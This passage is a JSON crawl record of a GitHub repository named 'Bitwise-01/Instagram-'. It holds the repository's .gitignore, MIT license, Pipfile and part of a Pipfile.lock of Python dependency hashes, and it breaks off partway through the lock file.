{
  "metadata": {
    "timestamp": 1736559630751,
    "page": 281,
    "hasNextPage": true,
    "endCursor": "Y3Vyc29yOjI5MA==",
    "completionStatus": "IN_PROGRESS"
  },
  "repositories": [
    {
      "nameWithOwner": "Bitwise-01/Instagram-",
      "stars": 4316,
      "defaultBranch": "master",
      "files": [
        {
          "name": ".gitignore",
          "type": "blob",
          "size": 0.02734375,
          "content": "database\n__pycache__\n.vscode"
        },
        {
          "name": "LICENSE",
          "type": "blob",
          "size": 1.0390625,
          "content": "MIT License\n\nCopyright (c) 2018 Mohamed\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the \"Software\"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n"
        },
        {
          "name": "Pipfile",
          "type": "blob",
          "size": 0.2841796875,
          "content": "[[source]]\nurl = \"https://pypi.org/simple\"\nverify_ssl = true\nname = \"pypi\"\n\n[packages]\nbs4 = \"*\"\nrequests = {extras = [\"socks\"], version = \"*\"}\ncolorama = \"*\"\npysocks = \"*\"\nrequests-html = \"*\"\n\n[dev-packages]\nblack = \"*\"\n\n[requires]\npython_version = \"3.9\"\n\n[pipenv]\nallow_prereleases = true\n"
        },
        {
          "name": "Pipfile.lock",
          "type": "blob",
          "size": 27.421875,
          "content": "{\n    \"_meta\": {\n        \"hash\": {\n            \"sha256\": \"8fb49e2cd154fec06d3e7c0d846414e49357ef265766b882fb148ad342c998d1\"\n        },\n        \"pipfile-spec\": 6,\n        \"requires\": {\n            \"python_version\": \"3.9\"\n        },\n        \"sources\": [\n            {\n                \"name\": \"pypi\",\n                \"url\": \"https://pypi.org/simple\",\n                \"verify_ssl\": true\n            }\n        ]\n    },\n    \"default\": {\n        \"appdirs\": {\n            \"hashes\": [\n                \"sha256:7d5d0167b2b1ba821647616af46a749d1c653740dd0d2415100fe26e27afdf41\",\n                \"sha256:a841dacd6b99318a741b166adb07e19ee71a274450e68237b4650ca1055ab128\"\n            ],\n            \"version\": \"==1.4.4\"\n        },\n        \"beautifulsoup4\": {\n            \"hashes\": [\n                \"sha256:58d5c3d29f5a36ffeb94f02f0d786cd53014cf9b3b3951d42e0080d8a9498d30\",\n                \"sha256:ad9aa55b65ef2808eb405f46cf74df7fcb7044d5cbc26487f96eb2ef2e436693\"\n            ],\n            \"markers\": \"python_version >= '3.6'\",\n            \"version\": \"==4.11.1\"\n        },\n        \"bs4\": {\n            \"hashes\": [\n                \"sha256:36ecea1fd7cc5c0c6e4a1ff075df26d50da647b75376626cc186e2212886dd3a\"\n            ],\n            \"index\": \"pypi\",\n            \"version\": \"==0.0.1\"\n        },\n        \"certifi\": {\n            \"hashes\": [\n                \"sha256:84c85a9078b11105f04f3036a9482ae10e4621616db313fe045dd24743a0820d\",\n                \"sha256:fe86415d55e84719d75f8b69414f6438ac3547d2078ab91b67e779ef69378412\"\n            ],\n            \"markers\": \"python_version >= '3.6'\",\n            \"version\": \"==2022.6.15\"\n        },\n        \"charset-normalizer\": {\n            \"hashes\": [\n                \"sha256:2857e29ff0d34db842cd7ca3230549d1a697f96ee6d3fb071cfa6c7393832597\",\n                \"sha256:6881edbebdb17b39b4eaaa821b438bf6eddffb4468cf344f09f89def34a8b1df\"\n            ],\n            \"markers\": \"python_version >= '3'\",\n            \"version\": \"==2.0.12\"\n        },\n        \"colorama\": {\n            \"hashes\": [\n                \"sha256:5941b2b48a20143d2267e95b1c2a7603ce057ee39fd88e7329b0c292aa16869b\",\n                \"sha256:9f47eda37229f68eee03b24b9748937c7dc3868f906e8ba69fbcbdd3bc5dc3e2\"\n            ],\n            \"index\": \"pypi\",\n            \"version\": \"==0.4.4\"\n        },\n        \"cssselect\": {\n            \"hashes\": [\n                \"sha256:f612ee47b749c877ebae5bb77035d8f4202c6ad0f0fc1271b3c18ad6c4468ecf\",\n                \"sha256:f95f8dedd925fd8f54edb3d2dfb44c190d9d18512377d3c1e2388d16126879bc\"\n            ],\n            \"markers\": \"python_version >= '2.7' and python_version not in '3.0, 3.1, 3.2, 3.3'\",\n            \"version\": \"==1.1.0\"\n        },\n        \"fake-useragent\": {\n            \"hashes\": [\n                \"sha256:c104998b750eb097eefc28ae28e92d66397598d2cf41a31aa45d5559ef1adf35\"\n            ],\n            \"version\": \"==0.1.11\"\n        },\n        \"idna\": {\n            \"hashes\": [\n                \"sha256:84d9dd047ffa80596e0f246e2eab0b391788b0503584e8945f2368256d2735ff\",\n                \"sha256:9d643ff0a55b762d5cdb124b8eaa99c66322e2157b69160bc32796e824360e6d\"\n            ],\n            \"markers\": \"python_version >= '3'\",\n            \"version\": \"==3.3\"\n        },\n        \"importlib-metadata\": {\n            \"hashes\": [\n                \"sha256:637245b8bab2b6502fcbc752cc4b7a6f6243bb02b31c5c26156ad103d3d45670\",\n                \"sha256:7401a975809ea1fdc658c3aa4f78cc2195a0e019c5cbc4c06122884e9ae80c23\"\n            ],\n            \"markers\": \"python_version >= '3.7'\",\n            \"version\": \"==4.12.0\"\n        },\n        \"lxml\": {\n            \"hashes\": [\n                \"sha256:04da965dfebb5dac2619cb90fcf93efdb35b3c6994fea58a157a834f2f94b318\",\n                \"sha256:0538747a9d7827ce3e16a8fdd201a99e661c7dee3c96c885d8ecba3c35d1032c\",\n                \"sha256:0645e934e940107e2fdbe7c5b6fb8ec6232444260752598bc4d09511bd056c0b\",\n                \"sha256:079b68f197c796e42aa80b1f739f058dcee796dc725cc9a1be0cdb08fc45b000\",\n                \"sha256:0f3f0059891d3254c7b5fb935330d6db38d6519ecd238ca4fce93c234b4a0f73\",\n                \"sha256:10d2017f9150248563bb579cd0d07c61c58da85c922b780060dcc9a3aa9f432d\",\n                \"sha256:1355755b62c28950f9ce123c7a41460ed9743c699905cbe664a5bcc5c9c7c7fb\",\n                \"sha256:13c90064b224e10c14dcdf8086688d3f0e612db53766e7478d7754703295c7c8\",\n                \"sha256:1423631e3d51008871299525b541413c9b6c6423593e89f9c4cfbe8460afc0a2\",\n                \"sha256:1436cf0063bba7888e43f1ba8d58824f085410ea2025befe81150aceb123e345\",\n                \"sha256:1a7c59c6ffd6ef5db362b798f350e24ab2cfa5700d53ac6681918f314a4d3b94\",\n                \"sha256:1e1cf47774373777936c5aabad489fef7b1c087dcd1f426b621fda9dcc12994e\",\n                \"sha256:206a51077773c6c5d2ce1991327cda719063a47adc02bd703c56a662cdb6c58b\",\n                \"sha256:21fb3d24ab430fc538a96e9fbb9b150029914805d551deeac7d7822f64631dfc\",\n                \"sha256:27e590352c76156f50f538dbcebd1925317a0f70540f7dc8c97d2931c595783a\",\n                \"sha256:287605bede6bd36e930577c5925fcea17cb30453d96a7b4c63c14a257118dbb9\",\n                \"sha256:2aaf6a0a6465d39b5ca69688fce82d20088c1838534982996ec46633dc7ad6cc\",\n                \"sha256:32a73c53783becdb7eaf75a2a1525ea8e49379fb7248c3eeefb9412123536387\",\n                \"sha256:41fb58868b816c202e8881fd0f179a4644ce6e7cbbb248ef0283a34b73ec73bb\",\n                \"sha256:4780677767dd52b99f0af1f123bc2c22873d30b474aa0e2fc3fe5e02217687c7\",\n                \"sha256:4878e667ebabe9b65e785ac8da4d48886fe81193a84bbe49f12acff8f7a383a4\",\n                \"sha256:487c8e61d7acc50b8be82bda8c8d21d20e133c3cbf41bd8ad7eb1aaeb3f07c97\",\n                \"sha256:4beea0f31491bc086991b97517b9683e5cfb369205dac0148ef685ac12a20a67\",\n                \"sha256:4cfbe42c686f33944e12f45a27d25a492cc0e43e1dc1da5d6a87cbcaf2e95627\",\n                \"sha256:4d5bae0a37af799207140652a700f21a85946f107a199bcb06720b13a4f1f0b7\",\n                \"sha256:4e285b5f2bf321fc0857b491b5028c5f276ec0c873b985d58d7748ece1d770dd\",\n                \"sha256:57e4d637258703d14171b54203fd6822fda218c6c2658a7d30816b10995f29f3\",\n                \"sha256:5974895115737a74a00b321e339b9c3f45c20275d226398ae79ac008d908bff7\",\n                \"sha256:5ef87fca280fb15342726bd5f980f6faf8b84a5287fcc2d4962ea8af88b35130\",\n                \"sha256:603a464c2e67d8a546ddaa206d98e3246e5db05594b97db844c2f0a1af37cf5b\",\n                \"sha256:6653071f4f9bac46fbc30f3c7838b0e9063ee335908c5d61fb7a4a86c8fd2036\",\n                \"sha256:6ca2264f341dd81e41f3fffecec6e446aa2121e0b8d026fb5130e02de1402785\",\n                \"sha256:6d279033bf614953c3fc4a0aa9ac33a21e8044ca72d4fa8b9273fe75359d5cca\",\n                \"sha256:6d949f53ad4fc7cf02c44d6678e7ff05ec5f5552b235b9e136bd52e9bf730b91\",\n                \"sha256:6daa662aba22ef3258934105be2dd9afa5bb45748f4f702a3b39a5bf53a1f4dc\",\n                \"sha256:6eafc048ea3f1b3c136c71a86db393be36b5b3d9c87b1c25204e7d397cee9536\",\n                \"sha256:830c88747dce8a3e7525defa68afd742b4580df6aa2fdd6f0855481e3994d391\",\n                \"sha256:86e92728ef3fc842c50a5cb1d5ba2bc66db7da08a7af53fb3da79e202d1b2cd3\",\n                \"sha256:8caf4d16b31961e964c62194ea3e26a0e9561cdf72eecb1781458b67ec83423d\",\n                \"sha256:8d1a92d8e90b286d491e5626af53afef2ba04da33e82e30744795c71880eaa21\",\n                \"sha256:8f0a4d179c9a941eb80c3a63cdb495e539e064f8054230844dcf2fcb812b71d3\",\n                \"sha256:9232b09f5efee6a495a99ae6824881940d6447debe272ea400c02e3b68aad85d\",\n                \"sha256:927a9dd016d6033bc12e0bf5dee1dde140235fc8d0d51099353c76081c03dc29\",\n                \"sha256:93e414e3206779ef41e5ff2448067213febf260ba747fc65389a3ddaa3fb8715\",\n                \"sha256:98cafc618614d72b02185ac583c6f7796202062c41d2eeecdf07820bad3295ed\",\n                \"sha256:9c3a88d20e4fe4a2a4a84bf439a5ac9c9aba400b85244c63a1ab7088f85d9d25\",\n                \"sha256:9f36de4cd0c262dd9927886cc2305aa3f2210db437aa4fed3fb4940b8bf4592c\",\n                \"sha256:a60f90bba4c37962cbf210f0188ecca87daafdf60271f4c6948606e4dabf8785\",\n                \"sha256:a614e4afed58c14254e67862456d212c4dcceebab2eaa44d627c2ca04bf86837\",\n                \"sha256:ae06c1e4bc60ee076292e582a7512f304abdf6c70db59b56745cca1684f875a4\",\n                \"sha256:b122a188cd292c4d2fcd78d04f863b789ef43aa129b233d7c9004de08693728b\",\n                \"sha256:b570da8cd0012f4af9fa76a5635cd31f707473e65a5a335b186069d5c7121ff2\",\n                \"sha256:bcaa1c495ce623966d9fc8a187da80082334236a2a1c7e141763ffaf7a405067\",\n                \"sha256:bd34f6d1810d9354dc7e35158aa6cc33456be7706df4420819af6ed966e85448\",\n                \"sha256:be9eb06489bc975c38706902cbc6888f39e946b81383abc2838d186f0e8b6a9d\",\n                \"sha256:c4b2e0559b68455c085fb0f6178e9752c4be3bba104d6e881eb5573b399d1eb2\",\n                \"sha256:c62e8dd9754b7debda0c5ba59d34509c4688f853588d75b53c3791983faa96fc\",\n                \"sha256:c852b1530083a620cb0de5f3cd6826f19862bafeaf77586f1aef326e49d95f0c\",\n                \"sha256:d9fc0bf3ff86c17348dfc5d322f627d78273eba545db865c3cd14b3f19e57fa5\",\n                \"sha256:dad7b164905d3e534883281c050180afcf1e230c3d4a54e8038aa5cfcf312b84\",\n                \"sha256:e5f66bdf0976ec667fc4594d2812a00b07ed14d1b44259d19a41ae3fff99f2b8\",\n                \"sha256:e8f0c9d65da595cfe91713bc1222af9ecabd37971762cb830dea2fc3b3bb2acf\",\n                \"sha256:edffbe3c510d8f4bf8640e02ca019e48a9b72357318383ca60e3330c23aaffc7\",\n                \"sha256:eea5d6443b093e1545ad0210e6cf27f920482bfcf5c77cdc8596aec73523bb7e\",\n                \"sha256:ef72013e20dd5ba86a8ae1aed7f56f31d3374189aa8b433e7b12ad182c0d2dfb\",\n                \"sha256:f05251bbc2145349b8d0b77c0d4e5f3b228418807b1ee27cefb11f69ed3d233b\",\n                \"sha256:f1be258c4d3dc609e654a1dc59d37b17d7fef05df912c01fc2e15eb43a9735f3\",\n                \"sha256:f9ced82717c7ec65a67667bb05865ffe38af0e835cdd78728f1209c8fffe0cad\",\n                \"sha256:fe17d10b97fdf58155f858606bddb4e037b805a60ae023c009f760d8361a4eb8\",\n                \"sha256:fe749b052bb7233fe5d072fcb549221a8cb1a16725c47c37e42b0b9cb3ff2c3f\"\n            ],\n            \"index\": \"pypi\",\n            \"version\": \"==4.9.1\"\n        },\n        \"parse\": {\n            \"hashes\": [\n                \"sha256:9ff82852bcb65d139813e2a5197627a94966245c897796760a3a2a8eb66f020b\"\n            ],\n            \"version\": \"==1.19.0\"\n        },\n        \"pyee\": {\n            \"hashes\": [\n                \"sha256:5c7e60f8df95710dbe17550e16ce0153f83990c00ef744841b43f371ed53ebea\",\n                \"sha256:c09f56e36eb10bf23aa2aacf145f690ded75b990a3d9523fd478b005940303d2\"\n            ],\n            \"version\": \"==8.2.2\"\n        },\n        \"pyppeteer\": {\n            \"hashes\": [\n                \"sha256:11a734d8f02c6b128035aba8faf32748f2016310a6a1cbc6aa5b1e2580742e8f\",\n                \"sha256:ddb0d15cb644720160d49abb1ad0d97e87a55581febf1b7531be9e983aad7742\"\n            ],\n            \"markers\": \"python_version >= '3.7' and python_version < '4'\",\n            \"version\": \"==1.0.2\"\n        },\n        \"pyquery\": {\n            \"hashes\": [\n                \"sha256:1fc33b7699455ed25c75282bc8f80ace1ac078b0dda5a933dacbd8b1c1f83963\",\n                \"sha256:a388eefb6bc4a55350de0316fbd97cda999ae669b6743ae5b99102ba54f5aa72\"\n            ],\n            \"version\": \"==1.4.3\"\n        },\n        \"pysocks\": {\n            \"hashes\": [\n                \"sha256:08e69f092cc6dbe92a0fdd16eeb9b9ffbc13cadfe5ca4c7bd92ffb078b293299\",\n                \"sha256:2725bd0a9925919b9b51739eea5f9e2bae91e83288108a9ad338b2e3a4435ee5\",\n                \"sha256:3f8804571ebe159c380ac6de37643bb4685970655d3bba243530d6558b799aa0\"\n            ],\n            \"index\": \"pypi\",\n            \"version\": \"==1.7.1\"\n        },\n        \"requests\": {\n            \"extras\": [\n                \"socks\"\n            ],\n            \"hashes\": [\n                \"sha256:6c1246513ecd5ecd4528a0906f910e8f0f9c6b8ec72030dc9fd154dc1a6efd24\",\n                \"sha256:b8aa58f8cf793ffd8782d3d8cb19e66ef36f7aba4353eec859e74678b01b07a7\"\n            ],\n            \"index\": \"pypi\",\n            \"version\": \"==2.26.0\"\n        },\n        \"requests-html\": {\n            \"hashes\": [\n                \"sha256:7e929ecfed95fb1d0994bb368295d6d7c4d06b03fcb900c33d7d0b17e6003947\",\n                \"sha256:cb8a78cf829c4eca9d6233f28524f65dd2bfaafb4bdbbc407f0a0b8f487df6e2\"\n            ],\n            \"index\": \"pypi\",\n            \"version\": \"==0.10.0\"\n        },\n        \"six\": {\n            \"hashes\": [\n                \"sha256:1e61c37477a1626458e36f7b1d82aa5c9b094fa4802892072e49de9c60c4c926\",\n                \"sha256:8abb2f1d86890a2dfb989f9a77cfcfd3e47c2a354b01111771326f8aa26e0254\"\n            ],\n            \"markers\": \"python_version >= '2.7' and python_version not in '3.0, 3.1, 3.2, 3.3'\",\n            \"version\": \"==1.16.0\"\n        },\n        \"soupsieve\": {\n            \"hashes\": [\n                \"sha256:3b2503d3c7084a42b1ebd08116e5f81aadfaea95863628c80a3b774a11b7c759\",\n                \"sha256:fc53893b3da2c33de295667a0e19f078c14bf86544af307354de5fcf12a3f30d\"\n            ],\n            \"markers\": \"python_version >= '3.6'\",\n            \"version\": \"==2.3.2.post1\"\n        },\n        \"tqdm\": {\n            \"hashes\": [\n                \"sha256:40be55d30e200777a307a7585aee69e4eabb46b4ec6a4b4a5f2d9f11e7d5408d\",\n                \"sha256:74a2cdefe14d11442cedf3ba4e21a3b84ff9a2dbdc6cfae2c34addb2a14a5ea6\"\n            ],\n            \"markers\": \"python_version >= '2.7' and python_version not in '3.0, 3.1, 3.2, 3.3'\",\n            \"version\": \"==4.64.0\"\n        },\n        \"urllib3\": {\n            \"hashes\": [\n                \"sha256:44ece4d53fb1706f667c9bd1c648f5469a2ec925fcf3a776667042d645472c14\",\n                \"sha256:aabaf16477806a5e1dd19aa41f8c2b7950dd3c746362d7e3223dbe6de6ac448e\"\n            ],\n            \"markers\": \"python_version >= '2.7' and python_version not in '3.0, 3.1, 3.2, 3.3, 3.4' and python_version < '4'\",\n            \"version\": \"==1.26.9\"\n        },\n        \"w3lib\": {\n            \"hashes\": [\n                \"sha256:0161d55537063e00d95a241663ede3395c4c6d7b777972ba2fd58bbab2001e53\",\n                \"sha256:0ad6d0203157d61149fd45aaed2e24f53902989c32fc1dccc2e2bfba371560df\"\n            ],\n            \"version\": \"==1.22.0\"\n        },\n        \"websockets\": {\n            \"hashes\": [\n                \"sha256:07cdc0a5b2549bcfbadb585ad8471ebdc7bdf91e32e34ae3889001c1c106a6af\",\n                \"sha256:210aad7fdd381c52e58777560860c7e6110b6174488ef1d4b681c08b68bf7f8c\",\n                \"sha256:28dd20b938a57c3124028680dc1600c197294da5db4292c76a0b48efb3ed7f76\",\n                \"sha256:2f94fa3ae454a63ea3a19f73b95deeebc9f02ba2d5617ca16f0bbdae375cda47\",\n                \"sha256:31564a67c3e4005f27815634343df688b25705cccb22bc1db621c781ddc64c69\",\n                \"sha256:347974105bbd4ea068106ec65e8e8ebd86f28c19e529d115d89bd8cc5cda3079\",\n                \"sha256:379e03422178436af4f3abe0aa8f401aa77ae2487843738542a75faf44a31f0c\",\n                \"sha256:3eda1cb7e9da1b22588cefff09f0951771d6ee9fa8dbe66f5ae04cc5f26b2b55\",\n                \"sha256:51695d3b199cd03098ae5b42833006a0f43dc5418d3102972addc593a783bc02\",\n                \"sha256:54c000abeaff6d8771a4e2cef40900919908ea7b6b6a30eae72752607c6db559\",\n                \"sha256:5b936bf552e4f6357f5727579072ff1e1324717902127ffe60c92d29b67b7be3\",\n                \"sha256:6075fd24df23133c1b078e08a9b04a3bc40b31a8def4ee0b9f2c8865acce913e\",\n                \"sha256:661f641b44ed315556a2fa630239adfd77bd1b11cb0b9d96ed8ad90b0b1e4978\",\n                \"sha256:6ea6b300a6bdd782e49922d690e11c3669828fe36fc2471408c58b93b5535a98\",\n                \"sha256:6ed1d6f791eabfd9808afea1e068f5e59418e55721db8b7f3bfc39dc831c42ae\",\n                \"sha256:7934e055fd5cd9dee60f11d16c8d79c4567315824bacb1246d0208a47eca9755\",\n                \"sha256:7ab36e17af592eec5747c68ef2722a74c1a4a70f3772bc661079baf4ae30e40d\",\n                \"sha256:7f6d96fdb0975044fdd7953b35d003b03f9e2bcf85f2d2cf86285ece53e9f991\",\n                \"sha256:83e5ca0d5b743cde3d29fda74ccab37bdd0911f25bd4cdf09ff8b51b7b4f2fa1\",\n                \"sha256:85506b3328a9e083cc0a0fb3ba27e33c8db78341b3eb12eb72e8afd166c36680\",\n                \"sha256:8af75085b4bc0b5c40c4a3c0e113fa95e84c60f4ed6786cbb675aeb1ee128247\",\n                \"sha256:8b1359aba0ff810d5830d5ab8e2c4a02bebf98a60aa0124fb29aa78cfdb8031f\",\n                \"sha256:8fbd7d77f8aba46d43245e86dd91a8970eac4fb74c473f8e30e9c07581f852b2\",\n                \"sha256:907e8247480f287aa9bbc9391bd6de23c906d48af54c8c421df84655eef66af7\",\n                \"sha256:93d5ea0b5da8d66d868b32c614d2b52d14304444e39e13a59566d4acb8d6e2e4\",\n                \"sha256:97bc9d41e69a7521a358f9b8e44871f6cdeb42af31815c17aed36372d4eec667\",\n                \"sha256:994cdb1942a7a4c2e10098d9162948c9e7b235df755de91ca33f6e0481366fdb\",\n                \"sha256:a141de3d5a92188234afa61653ed0bbd2dde46ad47b15c3042ffb89548e77094\",\n                \"sha256:a1e15b230c3613e8ea82c9fc6941b2093e8eb939dd794c02754d33980ba81e36\",\n                \"sha256:aad5e300ab32036eb3fdc350ad30877210e2f51bceaca83fb7fef4d2b6c72b79\",\n                \"sha256:b529fdfa881b69fe563dbd98acce84f3e5a67df13de415e143ef053ff006d500\",\n                \"sha256:b9c77f0d1436ea4b4dc089ed8335fa141e6a251a92f75f675056dac4ab47a71e\",\n                \"sha256:bb621ec2dbbbe8df78a27dbd9dd7919f9b7d32a73fafcb4d9252fc4637343582\",\n                \"sha256:c7250848ce69559756ad0086a37b82c986cd33c2d344ab87fea596c5ac6d9442\",\n                \"sha256:c8d1d14aa0f600b5be363077b621b1b4d1eb3fbf90af83f9281cda668e6ff7fd\",\n                \"sha256:d1655a6fc7aecd333b079d00fb3c8132d18988e47f19740c69303bf02e9883c6\",\n                \"sha256:d6353ba89cfc657a3f5beabb3b69be226adbb5c6c7a66398e17809b0ce3c4731\",\n                \"sha256:da4377904a3379f0c1b75a965fff23b28315bcd516d27f99a803720dfebd94d4\",\n                \"sha256:e49ea4c1a9543d2bd8a747ff24411509c29e4bdcde05b5b0895e2120cb1a761d\",\n                \"sha256:e4e08305bfd76ba8edab08dcc6496f40674f44eb9d5e23153efa0a35750337e8\",\n                \"sha256:e6fa05a680e35d0fcc1470cb070b10e6fe247af54768f488ed93542e71339d6f\",\n                \"sha256:e7e6f2d6fd48422071cc8a6f8542016f350b79cc782752de531577d35e9bd677\",\n                \"sha256:e904c0381c014b914136c492c8fa711ca4cced4e9b3d110e5e7d436d0fc289e8\",\n                \"sha256:ec2b0ab7edc8cd4b0eb428b38ed89079bdc20c6bdb5f889d353011038caac2f9\",\n                \"sha256:ef5ce841e102278c1c2e98f043db99d6755b1c58bde475516aef3a008ed7f28e\",\n                \"sha256:f351c7d7d92f67c0609329ab2735eee0426a03022771b00102816a72715bb00b\",\n                \"sha256:fab7c640815812ed5f10fbee7abbf58788d602046b7bb3af9b1ac753a6d5e916\",\n                \"sha256:fc06cc8073c8e87072138ba1e431300e2d408f054b27047d047b549455066ff4\"\n            ],\n            \"markers\": \"python_version >= '3.7'\",\n            \"version\": \"==10.3\"\n        },\n        \"zipp\": {\n            \"hashes\": [\n                \"sha256:56bf8aadb83c24db6c4b577e13de374ccfb67da2078beba1d037c17980bf43ad\",\n                \"sha256:c4f6e5bbf48e74f7a38e7cc5b0480ff42b0ae5178957d564d18932525d5cf099\"\n            ],\n            \"markers\": \"python_version >= '3.7'\",\n            \"version\": \"==3.8.0\"\n        }\n    },\n    \"develop\": {\n        \"black\": {\n            \"hashes\": [\n                \"sha256:802c6c30b637b28645b7fde282ed2569c0cd777dbe493a41b6a03c1d903f99ac\",\n                \"sha256:a042adbb18b3262faad5aff4e834ff186bb893f95ba3a8013f09de1e5569def2\"\n            ],\n            \"index\": \"pypi\",\n            \"version\": \"==21.11b1\"\n        },\n        \"click\": {\n            \"hashes\": [\n                \"sha256:7682dc8afb30297001674575ea00d1814d808d6a36af415a82bd481d37ba7b8e\",\n                \"sha256:bb4d8133cb15a609f44e8213d9b391b0809795062913b383c62be0ee95b1db48\"\n            ],\n            \"markers\": \"python_version >= '3.7'\",\n            \"version\": \"==8.1.3\"\n        },\n        \"mypy-extensions\": {\n            \"hashes\": [\n                \"sha256:090fedd75945a69ae91ce1303b5824f428daf5a028d2f6ab8a299250a846f15d\",\n                \"sha256:2d82818f5bb3e369420cb3c4060a7970edba416647068eb4c5343488a6c604a8\"\n            ],\n            \"version\": \"==0.4.3\"\n        },\n        \"pathspec\": {\n            \"hashes\": [\n                \"sha256:7d15c4ddb0b5c802d161efc417ec1a2558ea2653c2e8ad9c19098201dc1c993a\",\n                \"sha256:e564499435a2673d586f6b2130bb5b95f04a3ba06f81b8f895b651a3c76aabb1\"\n            ],\n            \"version\": \"==0.9.0\"\n        },\n        \"platformdirs\": {\n            \"hashes\": [\n                \"sha256:027d8e83a2d7de06bbac4e5ef7e023c02b863d7ea5d079477e722bb41ab25788\",\n                \"sha256:58c8abb07dcb441e6ee4b11d8df0ac856038f944ab98b7be6b27b2a3c7feef19\"\n            ],\n            \"markers\": \"python_version >= '3.7'\",\n            \"version\": \"==2.5.2\"\n        },\n        \"regex\": {\n            \"hashes\": [\n                \"sha256:042d122f9fee3ceb6d7e3067d56557df697d1aad4ff5f64ecce4dc13a90a7c01\",\n                \"sha256:047b2d1323a51190c01b6604f49fe09682a5c85d3c1b2c8b67c1cd68419ce3c4\",\n                \"sha256:0afa6a601acf3c0dc6de4e8d7d8bbce4e82f8542df746226cd35d4a6c15e9456\",\n                \"sha256:166ae7674d0a0e0f8044e7335ba86d0716c9d49465cff1b153f908e0470b8300\",\n                \"sha256:17443f99b8f255273731f915fdbfea4d78d809bb9c3aaf67b889039825d06515\",\n                \"sha256:17764683ea01c2b8f103d99ae9de2473a74340df13ce306c49a721f0b1f0eb9e\",\n                \"sha256:179410c79fa86ef318d58ace233f95b87b05a1db6dc493fa29404a43f4b215e2\",\n                \"sha256:186c5a4a4c40621f64d771038ede20fca6c61a9faa8178f9e305aaa0c2442a97\",\n                \"sha256:1a6f2698cfa8340dfe4c0597782776b393ba2274fe4c079900c7c74f68752705\",\n                \"sha256:1ab5cf7d09515548044e69d3a0ec77c63d7b9dfff4afc19653f638b992573126\",\n                \"sha256:1c1264eb40a71cf2bff43d6694ab7254438ca19ef330175060262b3c8dd3931a\",\n                \"sha256:1fc26bb3415e7aa7495c000a2c13bf08ce037775db98c1a3fac9ff04478b6930\",\n                \"sha256:24908aefed23dd065b4a668c0b4ca04d56b7f09d8c8e89636cf6c24e64e67a1e\",\n                \"sha256:249437f7f5b233792234aeeecb14b0aab1566280de42dfc97c26e6f718297d68\",\n                \"sha256:24963f0b13cc63db336d8da2a533986419890d128c551baacd934c249d51a779\",\n                \"sha256:26dbe90b724efef7820c3cf4a0e5be7f130149f3d2762782e4e8ac2aea284a0b\",\n                \"sha256:27624b490b5d8880f25dac67e1e2ea93dfef5300b98c6755f585799230d6c746\",\n                \"sha256:2ac29b834100d2c171085ceba0d4a1e7046c434ddffc1434dbc7f9d59af1e945\",\n                \"sha256:2f4c101746a8dac0401abefa716b357c546e61ea2e3d4a564a9db9eac57ccbce\",\n                \"sha256:30637e7fa4acfed444525b1ab9683f714be617862820578c9fd4e944d4d9ad1f\",\n                \"sha256:3adafe6f2c6d86dbf3313866b61180530ca4dcd0c264932dc8fa1ffb10871d58\",\n                \"sha256:3b9b6289e03dbe6a6096880d8ac166cb23c38b4896ad235edee789d4e8697152\",\n                \"sha256:3de1ecf26ce85521bf73897828b6d0687cc6cf271fb6ff32ac63d26b21f5e764\",\n                \"sha256:48dddddce0ea7e7c3e92c1e0c5a28c13ca4dc9cf7e996c706d00479652bff76c\",\n                \"sha256:495a4165172848503303ed05c9d0409428f789acc27050fe2cf0a4549188a7d5\",\n                \"sha256:4a11cbe8eb5fb332ae474895b5ead99392a4ea568bd2a258ab8df883e9c2bf92\",\n                \"sha256:4a5449adef907919d4ce7a1eab2e27d0211d1b255bf0b8f5dd330ad8707e0fc3\",\n                \"sha256:4b8838f70be3ce9e706df9d72f88a0aa7d4c1fea61488e06fdf292ccb70ad2be\",\n                \"sha256:4d206703a96a39763b5b45cf42645776f5553768ea7f3c2c1a39a4f59cafd4ba\",\n                \"sha256:4d42e3b7b23473729adbf76103e7df75f9167a5a80b1257ca30688352b4bb2dc\",\n                \"sha256:52684da32d9003367dc1a1c07e059b9bbaf135ad0764cd47d8ac3dba2df109bc\",\n                \"sha256:53d69d77e9cfe468b000314dd656be85bb9e96de088a64f75fe128dfe1bf30dd\",\n                \"sha256:555f7596fd1f123f8c3a67974c01d6ef80b9769e04d660d6c1a7cc3e6cff7069\",\n                \"sha256:5aba3d13c77173e9bfed2c2cea7fc319f11c89a36fcec08755e8fb169cf3b0df\",\n                \"sha256:5c8d61883a38b1289fba9944a19a361875b5c0170b83cdcc95ea180247c1b7d3\",\n                \"sha256:5e201b1232d81ca1a7a22ab2f08e1eccad4e111579fd7f3bbf60b21ef4a16cea\",\n                \"sha256:663dca677bd3d2e2b5b7d0329e9f24247e6f38f3b740dd9a778a8ef41a76af41\",\n                \"sha256:67ae3601edf86e15ebe40885e5bfdd6002d34879070be15cf18fc0d80ea24fed\",\n                \"sha256:68e5c641645351eb9eb12c465876e76b53717f99e9b92aea7a2dd645a87aa7aa\",\n                \"sha256:71988a76fcb68cc091e901fddbcac0f9ad9a475da222c47d3cf8db0876cb5344\",\n                \"sha256:775694cd0bb2c4accf2f1cdd007381b33ec8b59842736fe61bdbad45f2ac7427\",\n                \"sha256:7f648037c503985aed39f85088acab6f1eb6a0482d7c6c665a5712c9ad9eaefc\",\n                \"sha256:809bbbbbcf8258049b031d80932ba71627d2274029386f0452e9950bcfa2c6e8\",\n                \"sha256:8fd5f8ae42f789538bb634bdfd69b9aa357e76fdfd7ad720f32f8994c0d84f1e\",\n                \"sha256:933e72fbe1829cbd59da2bc51ccd73d73162f087f88521a87a8ec9cb0cf10fa8\",\n                